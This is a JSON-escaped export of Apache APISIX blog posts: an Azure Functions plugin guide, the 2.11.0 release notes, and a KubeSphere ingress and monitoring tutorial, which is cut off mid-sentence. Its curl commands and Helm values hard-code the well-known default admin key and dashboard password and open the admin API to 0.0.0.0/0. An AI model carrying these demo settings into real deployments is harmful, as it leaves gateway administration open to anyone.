http://localhost:9081/azure\\\\?name=Bisakh\\nHTTP/2 200\\ncontent-type: text/plain; charset=utf-8\\nrequest-context: appId=cid-v1:38aae829-293b-43c2-82c6-fa94aec0a071\\nDate: Wed, 19 Nov 2021 18:46:56 GMT\\nserver: APISIX/2.10.2\\n\\nHello, Bisakh\\n```\\n\\n### Deactivate the azure-functions plugin\\n\\nNow, to disable the plugin simply remove the corresponding JSON configuration in the plugin configuration to disable the `azure-functions` plugin and add the suitable upstream configuration. Apache APISIX plugins are hot-reloaded, therefore is no need to restart Apache APISIX.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/azure\\",\\n    \\"plugins\\": {},\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\n## Custom Configuration\\n\\nIn a minimal configuration while creating a new route with the `azure-functions` plugin enabled, `function_uri` is the mandatory attribute of the plugin config that points to the function URL. There is a lot of additional options that can be tweaked with plugin schema and metadata schema.\\n\\n### Plugin Schema\\n\\n|Name|Type|Required|Default|Valid|Description|\\n|----|----|--------|-------|-----|-----------|\\n|function_uri|string|required|n/a|n/a|The azure function endpoint which triggers the serverless function code (eg. http://test-apisix.azurewebsites.net/api/HttpTrigger).|\\n|authorization|object|optional|n/a|n/a|Authorization credentials to access the cloud function.|\\n|authorization.apikey|string|optional|n/a|n/a|Field inside authorization. The generate API Key to authorize requests to that endpoint.|\\n|authorization.clientid|string|optional|n/a|n/a|Field inside authorization. The Client ID ( azure active directory ) to authorize requests to that endpoint.|\\n|timeout|integer|optional|3000|[100,...]|Proxy request timeout in milliseconds.|\\n|ssl_verify|boolean|optional|true|true/false|Whether enabled performs SSL verification of the server.|\\n|keepalive|boolean|optional|true|true/false|To reuse the same proxy connection in near future. Set to false to disable keepalives and immediately close the connection.|\\n|keepalive_pool|integer|optional|5|[1,...]|The maximum number of connections in the pool.|\\n|keepalive_timeout|integer|optional|60000|[1000,...]|The maximal idle timeout (ms).|\\n\\nThis gives a whole lot of flexibility to tightly bind the behaviour of the azure faas - from configuring the timeout to the keepalive pool and validating the SSL certificate of the serverless faas. To be honest, this actually means a lot when it comes to serverless as the services are event-driven and resources are being allocated by the cloud provider on the fly.\\n\\n### Metadata Schema\\n\\nSimilarly, there are a few attributes that can be tweaked by using the metadata.\\n\\n|Name|Type|Required|Default|Valid|Description|\\n|----|----|--------|-------|-----|-----------|\\n|master_apikey|string|optional|\\"\\"|n/a|The API KEY secret that could be used to access the azure function URI.|\\n|master_clientid|string|optional|\\"\\"|n/a|The Client ID (active directory) that could be used the authorize the function URI.|\\n\\nMetadata for `azure-functions` plugin provides the functionality for authorization fallback. It defines `master_apikey` and `master_clientid`(azure active directory client id) where users (optionally) can define the master API key or Client ID for mission-critical application deployment. So if there are no authorization details found inside the plugin attribute the authorization details present in the metadata kicks in.\\n\\nThe relative priority ordering is as follows:\\n\\n- First, the plugin looks for `x-functions-key` or `x-functions-clientid` keys inside the request header to the Apache APISIX agent.\\n\\n- If they are not found, the azure-functions plugin checks for the authorization details inside plugin attributes. If present, it adds the respective header to the request sent to the Azure cloud function.\\n\\n- If no authorization details are found inside plugin attributes, Apache APISIX fetches the metadata config for this plugin and uses the master keys.\\n\\nTo add a new Master APIKEY, make a request to /apisix/admin/plugin_metadata endpoint with the updated metadata as follows:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/plugin_metadata/azure-functions \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"master_apikey\\" : \\"<Your azure master access key>\\"\\n}\'\\n```\\n\\n## Summary\\n\\nThe `azure-functions` plugin is Apache APISIX\'s second plugin designed for serverless. We are developing other serverless plugins and will feature them with the upcoming Apache APISIX releases. If you are interested, please don\'t hesitate to [file an issue](https://github.com/apache/apisix/issues/new/choose) to share your opinions. You can talk about your proposals for developing a new plugin in our [mailing list](https://apisix.apache.org/docs/general/join) as well!"},{"id":"Release Apache APISIX 2.11.0","metadata":{"permalink":"/blog/2021/12/01/release-apache-apisix-2.11","source":"@site/blog/2021/12/01/release-apache-apisix-2.11.md","title":"Release Apache APISIX 2.11.0","description":"API Gateway Apache APISIX 2.11.0 version is released, which supports LDAP and datadog plugins and provides Wasm related support and other functions.","date":"2021-12-01T00:00:00.000Z","formattedDate":"December 1, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.625,"truncated":true,"authors":[{"name":"Zexuan Luo","title":"Author","url":"https://github.com/spacewander","image_url":"https://avatars.githubusercontent.com/u/4161644?v=4","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"},{"name":"Sylvia","title":"Technical Writer","url":"https://github.com/SylviaBABY","image_url":"https://avatars.githubusercontent.com/u/39793568?v=4","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"Apache APISIX\'s integration with Azure Serverless","permalink":"/blog/2021/12/01/apisix-supports-azure-functions"},"nextItem":{"title":"Using APISIX Ingress to access custom monitoring in KubeSphere","permalink":"/blog/2021/11/30/use-apisix-ingress-in-kubesphere"}},"content":"> Apache APISIX 2.11.0 is officially released, which is the first version with new features after 2.10.0 LTS.\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX 2.11.0 is the first release with new features since the last 2.10.0 LTS release. It not only enriches the plugin library, but also brings fresh ecological support.\\n\\n## New feature: New LDAP-based authentication plugin\\n\\nApache APISIX has added a new member to its long list of authentication plugins - the LDAP-based `ldap-auth` plugin. With this plugin we can bridge the LDAP account system and the Apache APISIX Consumer mechanism.\\n\\nLet\'s show a simple example from the code side.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/consumers -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"username\\": \\"user01\\",\\n    \\"plugins\\": {\\n        \\"ldap-auth\\": {\\n            \\"user_dn\\": \\"cn=user01,ou=users,dc=example,dc=org\\"\\n        }\\n    }\\n}\'\\n```\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"methods\\": [\\"GET\\"],\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {\\n        \\"ldap-auth\\": {\\n            \\"base_dn\\": \\"ou=users,dc=example,dc=org\\",\\n            \\"ldap_uri\\": \\"localhost:1389\\",\\n            \\"uid\\": \\"cn\\"\\n        },\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```\\n\\nIn the above configuration, we have bound `user01` to `route 1`. This way we can access `route 1` with the password of `user01` and be authenticated by LDAP.\\n\\nThe result looks like this.\\n\\n```shell\\ncurl -i -uuser01:password1 http://127.0.0.1:9080/hello\\nHTTP/1.1 200 OK\\n...\\nhello, world\\n```\\n\\n## New feature: Observability level interfacing with more monitoring systems\\n\\nThe new version of Apache APISIX is enriched with support for external monitoring services. In this regard, we have added two new plugins.\\n\\n* `datadog` plugin for reporting metrics to datadog\\n* `skywalking-logger` plug-in to report access logs to Apache Skywalking\\n\\nDatadog is a widely used SaaS monitoring service overseas, while Apache Skywalking is a world-renowned open source monitoring software. Users can now interface with them with a simple configuration on their routes.\\n\\nDatadog example:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n      \\"plugins\\": {\\n            \\"datadog\\": {}\\n       },\\n      \\"upstream\\": {\\n           \\"type\\": \\"roundrobin\\",\\n           \\"nodes\\": {\\n               \\"127.0.0.1:1980\\": 1\\n           }\\n      },\\n      \\"uri\\": \\"/hello\\"\\n}\'\\n```\\n\\nApache SkyWalking example:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\":{\\n        \\"skywalking-logger\\":{\\n            \\"endpoint_addr\\":\\"http://127.0.0.1:12800\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:1980\\":1\\n        }\\n    },\\n    \\"uri\\":\\"/hello\\"\\n}\'\\n```\\n\\n## New feature: Exposing FaaS functions for Azure through a gateway\\n\\nThe gateway can do more than just proxy internal services, we can also use it to connect to external systems.\\n\\nNow with the `azure-functions` plugin, you can use HTTP requests to trigger functions on Azure functions services.\\n\\nThe following example shows how to connect a configured function on Azure to the `/azure_HttpTrigger` route on Apache APISIX.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\":{\\n        \\"azure-functions\\":{\\n            \\"function_uri\\":\\"http://test-apisix.azurewebsites.net/api/HttpTrigger\\",\\n            \\"authorization\\":{\\n                \\"apikey\\":\\"<Generated API key to access the Azure-Function>\\"\\n            }\\n        }\\n    },\\n    \\"uri\\":\\"/azure_HttpTrigger\\"\\n}\'\\n```\\n\\nThe access to this route is equivalent to a function call on the FaaS platform. At the same time, we can add authentication, flow restriction and other corresponding restrictions to this process.\\n\\n## New: WASM-related support\\n\\nInitial support for WASM is now available in Apache APISIX. With the Proxy WASM SDK, we can write plugins that run inside Apache APISIX in languages other than Lua.\\n\\nUnlike the previous external plug-in functionality, this mechanism runs inside Apache APISIX, so it is much better in terms of performance than before.\\n\\nUsing WASM plugins in Apache APISIX is like using Lua plugins, both of which support routing and global scoping. We have placed a WASM-based implementation of the `fault-injection` plugin in the Apache APISIX code repository, and interested readers can see how it differs from the Lua version of the plugin of the same name.\\n\\nMore technical details about Apache APISIX support for WASM can be found in [this article](https://apisix.apache.org/zh/blog/2021/11/19/apisix-supports-wasm).\\n\\nThe support for WASM in Apache APISIX is still in its early stages, and we will gradually improve and enrich the details in the next few releases.\\n\\n## Improvements: Existing plug-ins are more feature-rich\\n\\nIn addition to the new features mentioned above, we have also improved the functionality of existing plugins for Apache APISIX, such as\\n\\n* limit-req/conn/count and other plugins now support a set of variables as the key when limiting\\n* proxy-cache introduces a memory-based backend\\n\\nFor more details on the new features and components added to the plugin, please refer to the [Change log](https://github.com/apache/apisix/blob/release/2.11/CHANGELOG.md#2110) corresponding to this release.\\n\\n## Download\\n\\nGet the latest version of Apache APISIX 2.11.0, which can be downloaded and installed by:\\n\\n* [Source code](https://apisix.apache.org/downloads/)\\n* [binary installer](https://apisix.apache.org/zh/docs/apisix/how-to-build/)"},{"id":"Using APISIX Ingress to access custom monitoring in KubeSphere","metadata":{"permalink":"/blog/2021/11/30/use-apisix-ingress-in-kubesphere","source":"@site/blog/2021/11/30/use-apisix-ingress-in-kubesphere.md","title":"Using APISIX Ingress to access custom monitoring in KubeSphere","description":"This article uses Apache APISIX Ingress Controller as an example to introduce how to quickly use different gateways for Kubernetes clusters and monitor status through KubeSphere.","date":"2021-11-30T00:00:00.000Z","formattedDate":"November 30, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":12.7,"truncated":true,"authors":[{"name":"Haili Zhang","url":"https://github.com/webup","imageURL":"https://avatars.githubusercontent.com/u/2936504?v=4"}],"prevItem":{"title":"Release Apache APISIX 2.11.0","permalink":"/blog/2021/12/01/release-apache-apisix-2.11"},"nextItem":{"title":"Contributer to Committer journey @Apache APISIX","permalink":"/blog/2021/11/26/apache-apisix-committer-experience"}},"content":"> This article will take Apache APISIX Ingress Controller as an example to show you in detail how to quickly use different types of gateways and status monitoring for Kubernetes clusters through KubeSphere.\\n\\n\x3c!--truncate--\x3e\\n\\nIn early November, KubeSphere released version 3.2.0, which added a full set of monitoring and management pages for project gateways, and introduced cluster gateways to provide global Ingress gateway capabilities at the cluster level.\\n\\nTo help users better understand how to deploy and use third-party Ingress Controllers in the new version of KubeSphere, this article will use the [Apache APISIX Ingress Controller](https://apisix.apache.org/docs/ingress-controller/getting-started/) as an example to show you how to quickly use different types of gateways for Kubernetes clusters with KubeSphere and perform status monitoring.\\n\\n## Preparation\\n\\n### Installing KubeSphere\\n\\nThere are two ways to install KubeSphere.\\n\\n1. Install directly on [Linux](https://kubesphere.com.cn/docs/quick-start/all-in-one-on-linux/)\\n2. Install on [existing Kubernetes](https://kubesphere.com.cn/docs/quick-start/minimal-kubesphere-on-k8s/)\\n\\nThe monitoring module is already included in the minimal installation of KubeSphere, so there is no need to enable it additionally, and you can confirm the installation status via the Monitoring tab on the System Components page.\\n\\n![Confirm installation status](https://static.apiseven.com/202108/1638255471644-e1327ffc-dbed-4890-a15c-819f28731fc9.png)\\n\\n### Deploying the httpbin demo application\\n\\nSince we need to demonstrate the access control capabilities of the gateway, we must first have an accessible application as a backend service for the gateway. Here we use the [kennethreitz/httpbin](https://hub.docker.com/r/kennethreitz/httpbin/) container application provided by [httpbin.org](httpbin.org) as our demo application.\\n\\nIn KubeSphere, we can either create a new project or use an existing one. After entering the project page, select \\"Services\\" under \\"Application Loads\\" to directly create a stateless workload and generate a companion service.\\n\\n![Create a Service](https://static.apiseven.com/202108/1638255616585-b0f5a674-f06a-4b18-baf9-8d6006abeead.png)\\n\\nUse the default port `80` of the [kennethreitz/httpbin](https://hub.docker.com/r/kennethreitz/httpbin/) container as the service port, and make sure you can see the corresponding entry for `httpbin` under both the Workloads and Services pages after creation, as shown in the following image.\\n\\n![Service](https://static.apiseven.com/202108/1638255786442-924bf704-9b9d-413f-9fc0-be6650a6ff4a.png)\\n\\n![Workload](https://static.apiseven.com/202108/1638255792974-7f354950-e34a-427a-9ff7-aa3af0a56dd6.png)\\n\\n### Additional Project Gateway Details\\n\\nThe **Project Gateway** is a feature that has been live since KubeSphere 3.0. The Gateway in the KubeSphere Project is an NGINX Ingress controller. The mechanism built into KubeSphere for HTTP load balancing is called **Application Routing**, which defines the rules for connecting from the outside to the clustered service. To allow access to services from the outside, users can create routing resources to define URI paths, back-end service names, and other information.\\n\\nFollowing the `httpbin` service project deployed above, open the Gateway Settings page in Project Settings and perform the \\"Enable Gateway\\" operation. For convenience, just select `NodePort` as the \\"Access Method\\".\\n\\n![Project setting](https://static.apiseven.com/202108/1638256005754-d1e8bf9a-0ecc-4c6e-8ceb-0c25b04fef20.png)\\n\\nAfter complete the above operation, go back to the Gateway page, wait for a moment and refresh the page, you can get the deployment completion status as shown below, where you can see that NodePort is given two node ports by default. Next, we use the \\"Manage\\" button in the upper right corner to \\"View Details\\".\\n\\n![Deployment complete](https://static.apiseven.com/202108/1638256011357-960f6852-31b3-4702-8911-17d07ec19d7b.png)\\n\\nAt this point we are looking at the new monitoring page for the project/cluster gateway in version 3.2.0. Next we need to create an application route for the httpbin service.\\n\\nGo to the Application Routing page from Application Load and start \\"creating\\" the route. After naming the route `httpbin`, we specify a domain name for testing purposes and set the \\"path\\" to `/`, select \\"service\\" `httpbin` and \\"port\\" `80`.\\n\\n![Apply routin](https://static.apiseven.com/202108/1638241684770-ce94fe24-58a6-4b9b-9507-d802713b4c38.png)\\n\\n![Create route](https://static.apiseven.com/202108/1638241689985-149fc2f7-456b-423c-8cfc-00800dc24917.png)\\n\\nAfter skipping the advanced settings in the next step, the route creation is completed and you can get the `httpbin` application route entry as shown in the figure below.\\n\\n![Route creation](https://static.apiseven.com/202108/1638256382273-109728eb-4d19-4c2b-ab92-9a2909c3eff8.png)\\n\\nNext, we can access the httpbin application service through the NodePort address of the project gateway and the specified domain name (e.g., http://httpbin.ui:32516 here), refresh or manipulate the request generation function of the page at will, and then enter the details page of the gateway, you can see that the \\"Monitoring\\" panel has appeared some built-in monitoring indicators.\\n\\n![Generation function](https://static.apiseven.com/202108/1638256419345-48476f01-b293-401b-9e4f-8bf64a9fab90.png)\\n\\n#### Specifying the NodePort Node Port\\n\\nFor public cloud environments that use NodePort to expose access to the outside world, the open ports are usually limited and controlled, so we need to modify the NodePort used by the gateway.\\n\\nSince the gateway is managed by KubeSphere, to modify the NodePort of the gateway service, you need to have access to the `kubesphere-controls-system` project. Once inside the project, you can find the gateway service named `kubesphere-router-<project-namespace>` on the \\"Services\\" page under \\"Application Load\\", and the NodePort is open for external access.\\n\\n![Application Load](https://static.apiseven.com/202108/1638256523468-408ee36f-aac7-4bb4-9cd3-2473a95a52f4.png)\\n\\n## Getting Started with Clustered Gateways\\n\\n>KubeSphere 3.2.0 supports global gateways at the cluster level, so all projects can share the same gateway, and previously created project gateways are not affected by the cluster gateway. Gateways for all projects can be managed and configured centrally, eliminating the need to switch to a different enterprise space to configure gateways.\\n\\nIf you are using KubeSphere version 3.2.0, we recommend using the cluster gateway feature to unify the application routing across the cluster. To enable the cluster gateway, it\'s very simple: use an account with cluster management privileges to access one of the clusters you can manage (e.g. default cluster here), and under \\"Gateway Settings\\" in \\"Cluster Settings\\", you can \\"Enable Gateway\\" and view the \\"Project Gateway\\".\\n\\n![Project gateway](https://static.apiseven.com/202108/1638256574546-920473f3-e8ac-4cf9-932b-4202888e7a54.png)\\n\\nThe way the cluster gateway is opened and the modification of the aligned NodePort access port are basically the same as the previous project gateway, so we won\'t go into details here.\\n\\nHowever, there is one point that needs special attention: after the cluster gateway is opened, the gateway of the project that has been opened will remain; however, the project that has not yet created a gateway cannot create a separate gateway, and will use the cluster gateway directly.\\n\\nThe following figure shows the overview of all gateways in the \\"Gateway Settings\\" page for projects that have already created gateways, after having both project and cluster gateways.\\n\\n![Gateway setting](https://static.apiseven.com/202108/1638256658706-ac5107fe-2fd7-4521-b830-9ae1fdf762e1.png)\\n\\n## A Quick Look at Apache APISIX Ingress Controller\\n\\nApache APISIX is an open source, high-performance, dynamic cloud-native gateway donated to the Apache Foundation by Shenzhen Tributary Technology Co. in 2019, and is now the top open source project of the Apache Foundation and the most active gateway project on GitHub.Apache APISIX currently covers API gateways, LB Kubernetes Ingress, Service Mesh, and many other scenarios.\\n\\n### How to deploy\\n\\nFirst add the Apache APISIX Helm Chart repository. After that, select an enterprise space and add the following [Apache APISIX repository](https://charts.apiseven.com) via \\"Application Repository\\" under \\"Application Management\\".\\n\\n![Application repository](https://static.apiseven.com/202108/1638256788584-dca2d21b-3ffc-4bb4-bd73-56dedb6d005a.png)\\n\\nNext, create a project named `apisix-system`. Once you are on the project page, select the Create an Application in Application Load method to deploy Apache APISIX, and select the `apisix` application template to start the deployment.\\n\\n![start the deployment](https://static.apiseven.com/202108/1638241691528-80090ab6-85de-401f-96d7-58118b3cbd88.png)\\n\\n>Why deploy the Apache APISIX application Helm Chart directly instead of deploying the Apache APISIX Ingress Controller directly?\\n\\nThis is because the Apache APISIX Ingress Controller is currently strongly associated with the Apache APISIX Gateway (as shown in the figure below), and it is currently most convenient to deploy Apache APISIX Gateway + Dashboard + Ingress Controller through Apache APISIX Helm Charts at the same time. Ingress Controller is the most convenient, so this article recommends using Apache APISIX Helm Charts directly for the deployment of the whole set of components.\\n\\n![Why use APISIX gateway](https://static.apiseven.com/202108/1638241693072-9b3146f5-bcc6-4441-b002-f1a07603a8c4.png)\\n\\nName the application apisix to avoid mismatches between workloads and service names of multiple components (Gateway, Dashboard, Ingress Controller); in the \\"Application Settings\\" section edited in the installation steps, please fill in the following configuration (please pay special attention to the notes marked with [Note], the rest (The rest can be edited and modified by yourself as needed).\\n\\n```yaml\\nglobal:\\n  imagePullSecrets: []\\n  \\napisix:\\n  enabled: true\\n  customLuaSharedDicts: []\\n  image:\\n    repository: apache/apisix\\n    pullPolicy: IfNotPresent\\n    tag: 2.10.1-alpine\\n  replicaCount: 1\\n  podAnnotations: {}\\n  podSecurityContext: {}\\n  securityContext: {}\\n  resources: {}\\n  nodeSelector: {}\\n  tolerations: []\\n  affinity: {}\\n  podAntiAffinity:\\n    enabled: false\\n\\nnameOverride: \'\'\\nfullnameOverride: \'\'\\n\\ngateway:\\n  type: NodePort\\n  externalTrafficPolicy: Cluster\\n  http:\\n    enabled: true\\n    servicePort: 80\\n    containerPort: 9080\\n  tls:\\n    enabled: false\\n    servicePort: 443\\n    containerPort: 9443\\n    existingCASecret: \'\'\\n    certCAFilename: \'\'\\n    http2:\\n      enabled: true\\n  stream:\\n    enabled: false\\n    only: false\\n    tcp: []\\n    udp: []\\n  ingress:\\n    enabled: false\\n    annotations: {}\\n    hosts:\\n      - host: apisix.local\\n        paths: []\\n    tls: []\\n\\nadmin:\\n  enabled: true\\n  type: ClusterIP\\n  externalIPs: []\\n  port: 9180\\n  servicePort: 9180\\n  cors: true\\n  credentials:\\n    admin: edd1c9f034335f136f87ad84b625c8f1\\n    viewer: 4054f7cf07e344346cd3f287985e76a2\\n  allow:\\n    ipList:\\n      - 0.0.0.0/0\\n\\nplugins:\\n  - api-breaker\\n  - authz-keycloak\\n  - basic-auth\\n  - batch-requests\\n  - consumer-restriction\\n  - cors\\n  - echo\\n  - fault-injection\\n  - grpc-transcode\\n  - hmac-auth\\n  - http-logger\\n  - ip-restriction\\n  - ua-restriction\\n  - jwt-auth\\n  - kafka-logger\\n  - key-auth\\n  - limit-conn\\n  - limit-count\\n  - limit-req\\n  - node-status\\n  - openid-connect\\n  - authz-casbin\\n  - prometheus\\n  - proxy-cache\\n  - proxy-mirror\\n  - proxy-rewrite\\n  - redirect\\n  - referer-restriction\\n  - request-id\\n  - request-validation\\n  - response-rewrite\\n  - serverless-post-function\\n  - serverless-pre-function\\n  - sls-logger\\n  - syslog\\n  - tcp-logger\\n  - udp-logger\\n  - uri-blocker\\n  - wolf-rbac\\n  - zipkin\\n  - traffic-split\\n  - gzip\\n  - real-ip\\n  # [note] add this plug-in to cooperate with Dashboard to display service information\\n  - server-info\\n\\nstream_plugins:\\n  - mqtt-proxy\\n  - ip-restriction\\n  - limit-conn\\n\\ncustomPlugins:\\n  enabled: true\\n  luaPath: /opts/custom_plugins/?.lua\\n  # [note] the following configuration ensures that the Prometheus plug-in can expose indicators to the outside world.\\n  plugins:\\n   - name: prometheus\\n     attrs:\\n       export_addr:\\n         ip: 0.0.0.0\\n          port: 9091\\n      configMap:\\n       name: prometheus\\n        mounts: []\\n\\ndns:\\n  resolvers:\\n    - 127.0.0.1\\n    - 172.20.0.10\\n    - 114.114.114.114\\n    - 223.5.5.5\\n    - 1.1.1.1\\n    - 8.8.8.8\\n  validity: 30\\n  timeout: 5\\n\\nautoscaling:\\n  enabled: false\\n  minReplicas: 1\\n  maxReplicas: 100\\n  targetCPUUtilizationPercentage: 80\\n  targetMemoryUtilizationPercentage: 80\\n\\nconfigurationSnippet:\\n  main: \'\'\\n  httpStart: \'\'\\n  httpEnd: \'\'\\n  httpSrv: \'\'\\n  httpAdmin: \'\'\\n  stream: \'\'\\n\\netcd:\\n  enabled: true\\n  host:\\n    - \'http://etcd.host:2379\'\\n  prefix: /apisix\\n  timeout: 30\\n  auth:\\n    rbac:\\n      enabled: false\\n      user: \'\'\\n      password: \'\'\\n    tls:\\n      enabled: false\\n      existingSecret: \'\'\\n      certFilename: \'\'\\n      certKeyFilename: \'\'\\n      verify: true\\n  service:\\n    port: 2379\\n  replicaCount: 3\\n\\ndashboard:\\n  enabled: true\\n  # [note] Enable NodePort for Dashboard to facilitate subsequent use\\n  service:\\n   type: NodePort\\n\\ningress-controller:\\n  enabled: true\\n  config:\\n    apisix:\\n     # [note] Be sure to set the namespace where gateway is located\\n      serviceNamespace: apisix-system\\n  serviceMonitor:\\n    enabled: true\\n    namespace: \'apisix-system\'\\n    interval: 15s\\n```\\n\\nAfter successful deployment, click the application name to enter the details page, and you can see the following service deployment and working status operation status display under the \\"Resource Status\\" tab.\\n\\n![Resource status](https://static.apiseven.com/202108/1638241694605-7d88f095-fef5-43f4-9752-8dc5a2f9abc4.png)\\n\\n:::note\\nThe default configuration parameters for the other two Helm Charts of the Apache APISIX project can be found in [Dashboard](https://github.com/apache/apisix-helm-chart/blob/master/charts/apisix-dashboard/values.yaml) and [Ingress Controller](https://github.com/apache/apisix-helm-chart/blob/master/charts/apisix-ingress-controller/values.yaml) `values.yaml`.\\n:::\\n\\n### Dashboard Usage\\n\\nAfter the Apache APISIX application is deployed, you can check the current status of the Apache APISIX gateway through the Apache APISIX Dashboard.\\n\\nYou can find the `apisix-dashboard` service from the application load-services page. Since we have enabled NodePort for Dashboard in the application configuration, you can access Dashboard directly through the NodePort port here.\\n\\n![Dahboard view](https://static.apiseven.com/202108/1638241699353-8d54dfe9-8439-4085-8e7d-02583a1d0d9e.png)\\n\\nLog in to the Apache APISIX Dashboard with the default user name and password `admin`, and you can enter the System Information page to view the information of Apache APISIX nodes currently connected to management.\\n\\n![Enter name and password](https://static.apiseven.com/202108/1638241703083-0915a427-9aab-41e6-8c76-be60d70fc135.png)\\n\\n### How to use\\n\\nNext, let\'s go back to the \\"Apply Routes\\" page, create another route (e.g. `apisix-httpbin`), set the path to `/*` `httpbin` `80` and add the key `kubernetes.io/ingress.class`: `apisix` to it.\\n\\n![Create route](https://static.apiseven.com/202108/1638241705123-6fe3ba11-bc08-4fb2-a8b1-73066ce73679.png)\\n\\n![Setting details](https://static.apiseven.com/202108/1638241706790-3989c06d-c803-4c16-869a-6fa000b5744b.png)\\n\\n#### Verify that the application route is effective\\n\\nGo back to the Apache APISIX Dashboard and enter the \\"Routes\\" page. You can see that the newly created application route has been recognized by the Apache APISIX Ingress Controller and automatically added to the Apache APISIX gateway, and you can also see an automatically created upstream entry in the \\"Upstream\\" page.\\n\\n![Verify route is effective](https://static.apiseven.com/202108/1638241712811-db1f93dd-2963-4034-b461-26733d173bae.png)\\n\\nNext, go back to the `apisix-system` project \\"Services\\" page, find the port corresponding to the `apisix-gateway` service, and access `<apisix-httpbin application routing domain name>:<apisix-gateway external access port>` (for example, `httpbin.ui:30408` here) to access the backend service associated with the `apisix-httpbin` application route.\\n\\n![Service page](https://static.apiseven.com/202108/1638241716159-134e6bd8-9e08-46de-8d46-39142c439b8f.png)\\n\\n## Custom Monitoring of Apache APISIX Gateways\\n\\nMonitoring capabilities can be augmented when using the Apache APISIX gateway through the Prometheus plug-in and the custom monitoring capabilities that come with KubeSphere.\\n\\n### Exposing relevant Prometheus monitoring metrics\\n\\nSince we have already enabled the [Prometheus plugin](https://apisix.apache.org/docs/apisix/plugins/prometheus) when deploying the Apache APISIX application, we only need to expose the interface to the Prometheus monitoring metrics.\\n\\nGo to the `apisix-system` project, find apisix on the \\"Workloads\\" page and go to the deployment details page, then select \\"Edit Settings\\" from \\"More Actions\\" in the left action panel.\\n\\n![APISIX workloads page](https://static.apiseven.com/202108/1638241718162-86d110b6-2c40-461c-9cf4-a13b73cf5768.png)\\n\\nIn the pop-up panel, go to the `apisix` container editing interface, find \\"Port Settings\\", add a new port named `prom` to map to port `9091` of the container, save it and the `apisix` workload will restart.\\n\\n![APISIX container](https://static.apiseven.com/202108/1638241721050-c3e9409c-4ec8-4ff1-bcf8-045ea57ec179.png)\\n\\n### Creating a ServiceMonitor for monitoring metrics\\n\\nNext, we need to connect the exposed metrics interface to KubeSphere\'s own Prometheus to make it accessible (to grab the metrics data).\\n\\nSince KubeSphere maintains the internal Prometheus system through the [Prometheus Operator](https://github.com/prometheus-operator/prometheus-operator), the quickest way to access the metrics is to create a ServiceMonitor resource directly.\\n\\n```yaml\\napiVersion: monitoring.coreos.com/v1\\nkind: ServiceMonitor\\nmetadata:\\n  name: apisix\\n  namespace: apisix-system\\nspec:\\n  endpoints:\\n    - scheme: http\\n     # [note] use the container port name exposed by the workload in the previous step\\n     targetPort: prom\\n     # [note] you need to bind the metric interface path corresponding to apisix correctly.\\n     path: /apisix/prometheus/metrics\\n      interval: 15s\\n  namespaceSelector:\\n    matchNames:\\n      - apisix-system\\n  selector:\\n    matchLabels:\\n      app.kubernetes.io/name: apisix\\n      app.kubernetes.io/version: 2.10.0\\n      helm.sh/chart: apisix-0.7.2\\n```\\n\\nCreate the ServiceMonitor resource using `kubectl apply -f your_service_monitor.yaml`. Once created, you can also search for the ServiceMonitor resource in the cluster\'s CRD management page and find a custom resource named `apisix`, if you have cluster management privileges, and make subsequent YAML changes here.\\n\\n![Create ServiceMonitor](https://static.apiseven.com/202108/1638241723331-64cb363e-b6af-4af4-93f3-29a79c9a5e77.png)\\n\\n### Indicator access to custom monitoring panel\\n\\nFind \\"Custom Monitoring\\" under \\"Monitoring Alarms\\" in the menu list on the left side of the project, and start to \\"create\\" custom monitoring panels.\\n\\n![Create monitor panels](https://static.apiseven.com/202108/1638241724906-d9531809-4682-49b3-b90b-d7f3a03e70e3.png)\\n\\nFill in \\"Name\\" in the pop-up window, select \\"Custom\\" monitoring template, and go to \\"Next\\" to create the monitoring panel.\\n\\n![Setting details](https://static.apiseven.com/202108/1638241727938-cd3843f9-0e22-4316-91d2-84b56cd66f21.png)\\n\\nAfter entering the edit page now click on the `+` area on the left side and configure the Prometheus monitoring metrics in the \\"Data\\" area on the right side. For example, here we can use `sum(apisix_nginx_http_current_connections)` to count the total number of connections to the Apache APISIX gateway in real time.\\n\\n![Connect to APISIX gateway](https://static.apiseven.com/202108/1638241729416-3d2024f1-9586-44ac-ad6c-7472c8924fc8.png)\\n\\nAfter saving, find \\"+ Add monitoring item\\" in the bottom-right corner of the page and select \\"Line Chart\\" to create the Nginx connection state metric: use `sum(apisix_nginx_http_current_connections) by (state)` as the metric, `{{state}}` as the legend name, and \\"Legend type\\" as the stacked 